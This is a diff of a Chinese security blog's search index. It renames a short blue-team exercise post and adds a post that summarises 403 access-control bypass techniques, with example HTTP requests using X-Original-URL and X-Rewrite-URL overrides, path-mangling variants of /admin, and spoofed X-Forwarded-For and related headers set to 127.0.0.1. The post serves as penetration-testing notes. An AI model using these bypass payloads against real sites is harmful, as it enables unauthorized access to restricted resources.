@@ -296,22 +296,6 @@
       </categories>
   </entry>
   <entry>
-    <title>蓝队一般套路</title>
-    <url>/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
-    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>   <strong><em>近期参与了几个攻防演练，想趁热打铁记点东西~</em></strong></p>
-<h2 id="0x01-基本了解"><a href="#0x01-基本了解" class="headerlink" title="0x01 基本了解"></a><strong><em>0x01 基本了解</em></strong></h2><p><strong><em>蓝队以参演单位现有防护运营体系为基础， 应对实战攻防组建一支防守队伍。主要负责前期安全、 检查、整改与加固，演练期间网络安全监测、预警、 分析、验证、处置，后期复盘总结现有防护工作中不 足之处，为后期常态化防护工作提供优化依据。</em></strong></p>
-<h2 id="0x02-常规角色与分工情况"><a href="#0x02-常规角色与分工情况" class="headerlink" title="0x02  常规角色与分工情况"></a><strong><em>0x02  常规角色与分工情况</em></strong></h2><p><strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
-<h2 id="0x03-一般实施思路"><a href="#0x03-一般实施思路" class="headerlink" title="0x03 一般实施思路"></a><strong><em>0x03 一般实施思路</em></strong></h2><p> <strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
-<h2 id="0x04-一些体会"><a href="#0x04-一些体会" class="headerlink" title="0x04 一些体会"></a><strong><em>0x04 一些体会</em></strong></h2><p><strong><em>上面讲了一些介绍，提了点思路，下面讲下体会~</em></strong></p>
-<p><strong><em>1、对外暴露资产及弱口令的梳理非常关键。</em></strong></p>
-<p><strong><em>2、监测设备能不能”打”很关键。</em></strong></p>
-<p><strong><em>3、多做能向客户体现价值的活（汇报、提建议），脏活累活给友商~~</em></strong></p>
-]]></content>
-      <categories>
-        <category>技战法</category>
-      </categories>
-  </entry>
-  <entry>
     <title>风险评估的一般套路~</title>
     <url>/2020/07/12/%E9%A3%8E%E9%99%A9%E8%AF%84%E4%BC%B0%E7%9A%84%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
     <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>​     <strong><em>风险评估是组织用于确定信息安全需求的重要方法，建设信息安全管理体系的必要途径，是作为信息安全管理者的必备能力， 希望对大家了解或实施有所帮助~</em></strong></p>
@@ -431,6 +415,54 @@
 ]]></content>
       <categories>
         <category>安全技巧</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>403绕过小结</title>
+    <url>/2021/01/17/403%E7%BB%95%E8%BF%87%E5%B0%8F%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="0x00-前言："><a href="#0x00-前言：" class="headerlink" title="0x00 前言："></a><strong><em>0x00 前言：</em></strong></h2><p><strong><em>近期浏览到关于403绕过的技巧文章（<a href="https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ%EF%BC%89">https://mp.weixin.qq.com/s/_hcVp9u7OIHnYW1l7lQiCQ）</a></em></strong></p>
+<p><strong><em>饶有兴致，稍作小结，权当记录~</em></strong></p>
+<h2 id="0x01-改变请求方式："><a href="#0x01-改变请求方式：" class="headerlink" title="0x01 改变请求方式："></a><strong><em>0x01 改变请求方式：</em></strong></h2><h3 id="1、覆盖请求URL"><a href="#1、覆盖请求URL" class="headerlink" title="1、覆盖请求URL"></a><strong><em>1、覆盖请求URL</em></strong></h3><p><strong><em>尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制，通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。</em></strong></p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Original-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br><span class="line">	</span><br><span class="line">Request</span><br><span class="line">	GET &#x2F;1.1</span><br><span class="line">	X-Rewrite-URL:&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">	HTTP&#x2F;1.1. 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、修改拓展名"><a href="#2、修改拓展名" class="headerlink" title="2、修改拓展名"></a><strong><em>2、修改拓展名</em></strong></h3><p><strong><em>基于扩展名，用于绕过403受限制的目录</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site.com&#x2F;admin &#x3D;&gt; 403</span><br><span class="line">site.com&#x2F;admin&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;&#x2F;admin&#x2F;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;* &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;*&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;.&#x2F;admin&#x2F;.&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;.&#x2F;. &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin?? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin??? &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin&#x2F;..;&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2f&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%2e&#x2F;admin &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%20&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;admin%09&#x2F; &#x3D;&gt; 200</span><br><span class="line">site.com&#x2F;%20admin%20&#x2F; &#x3D;&gt; 200</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-改变请求内容："><a href="#0x02-改变请求内容：" class="headerlink" title="0x02 改变请求内容："></a><strong><em>0x02 改变请求内容：</em></strong></h2><h3 id="1、修改-添加-Referer或HOST头"><a href="#1、修改-添加-Referer或HOST头" class="headerlink" title="1、修改/添加 Referer或HOST头"></a><strong><em>1、修改/添加 Referer或HOST头</em></strong></h3><p><strong><em>若服务器之间的业务访问控制是通过Referer或HOST头去关联，则可以尝试修改/添加 Referer 或HOST头去绕</em></strong>~</p>
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 403 Forbidden</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br><span class="line">  </span><br><span class="line">  or</span><br><span class="line">  </span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">  Host: xxxx</span><br><span class="line">  ReFerer:https:&#x2F;&#x2F;xxx&#x2F;console&#x2F;login</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、添加代理IP"><a href="#2、添加代理IP" class="headerlink" title="2、添加代理IP"></a><strong><em>2、添加代理IP</em></strong></h3><p><strong><em>若应用是通过代理识别访问端IP限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制~</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一般代理头姿势如下：</span><br><span class="line">- X-Originating-IP: 127.0.0.1</span><br><span class="line">- X-Remote-IP: 127.0.0.1</span><br><span class="line">- X-Client-IP: 127.0.0.1</span><br><span class="line">- X-Forwarded-For: 127.0.0.1</span><br><span class="line">- X-Forwared-Host: 127.0.0.1</span><br><span class="line">- X-Host: 127.0.0.1</span><br><span class="line">- X-Custom-IP-Authorization: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><strong><em>示例：</em></strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Request</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 401 Unauthorized</span><br><span class="line"></span><br><span class="line">Reqeust</span><br><span class="line">  GET &#x2F;console&#x2F;login HTTP&#x2F;1.1</span><br><span class="line">  X-Custom-IP-Authorization: 127.0.0.1</span><br><span class="line">Response</span><br><span class="line">  HTTP&#x2F;1.1 200 OK</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-个人小结："><a href="#0x03-个人小结：" class="headerlink" title="0x03 个人小结："></a><strong><em>0x03 个人小结：</em></strong></h2><p><strong><em>就针对绕过而言，不管是改变请求方式还是请求内容，目的其实都是让请求看起来是合理的。（不是屁话么？）</em></strong></p>
+]]></content>
+      <categories>
+        <category>安全技巧</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>蓝队项目经理一般套路</title>
+    <url>/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/</url>
+    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong><em>0x00 前言</em></strong></h2><p>   <strong><em>近期参与了几个攻防演练，想趁热打铁记点东西~</em></strong></p>
+<h2 id="0x01-基本了解"><a href="#0x01-基本了解" class="headerlink" title="0x01 基本了解"></a><strong><em>0x01 基本了解</em></strong></h2><p><strong><em>蓝队以参演单位现有防护运营体系为基础， 应对实战攻防组建一支防守队伍。主要负责前期安全、 检查、整改与加固，演练期间网络安全监测、预警、 分析、验证、处置，后期复盘总结现有防护工作中不 足之处，为后期常态化防护工作提供优化依据。</em></strong></p>
+<h2 id="0x02-常规角色与分工情况"><a href="#0x02-常规角色与分工情况" class="headerlink" title="0x02  常规角色与分工情况"></a><strong><em>0x02  常规角色与分工情况</em></strong></h2><p><strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/2.png" class></strong></p>
+<h2 id="0x03-一般实施思路"><a href="#0x03-一般实施思路" class="headerlink" title="0x03 一般实施思路"></a><strong><em>0x03 一般实施思路</em></strong></h2><p> <strong><img src="/2020/08/24/%E8%93%9D%E9%98%9F%E9%A1%B9%E7%9B%AE%E7%BB%8F%E7%90%86%E4%B8%80%E8%88%AC%E5%A5%97%E8%B7%AF/1.png" class></strong></p>
+<h2 id="0x04-一些体会"><a href="#0x04-一些体会" class="headerlink" title="0x04 一些体会"></a><strong><em>0x04 一些体会</em></strong></h2><p><strong><em>上面讲了一些介绍，提了点思路，下面讲下体会~</em></strong></p>
+<p><strong><em>1、对外暴露资产及弱口令的梳理非常关键。</em></strong></p>
+<p><strong><em>2、监测设备能不能”打”很关键。</em></strong></p>
+<p><strong><em>3、多做能向客户体现价值的活（汇报、提建议），脏活累活给友商~~</em></strong></p>
+]]></content>
+      <categories>
+        <category>技战法</category>
       </categories>
   </entry>
 </search>
